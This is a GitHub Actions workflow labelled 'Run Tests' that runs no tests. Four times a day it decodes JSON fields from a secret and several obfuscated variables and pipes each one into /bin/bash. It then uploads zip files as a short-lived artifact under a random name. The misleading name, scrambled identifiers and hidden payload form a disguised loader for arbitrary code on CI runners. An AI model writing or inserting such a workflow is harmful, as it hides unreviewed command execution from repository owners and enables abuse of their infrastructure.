name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '36 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          opsd64: ${{ secrets.opsd64 }}
        run: |
          printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
          printf '%s' "$lykdy977" | jq -r .sagg4099 | /bin/bash
          echo $e1 | jq -r .mpmqd417 | /bin/bash
          printf '%s' "$a2095" | jq -r .f54197 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: DpIZAAck
          path: "*.zip"
          retention-days: 1
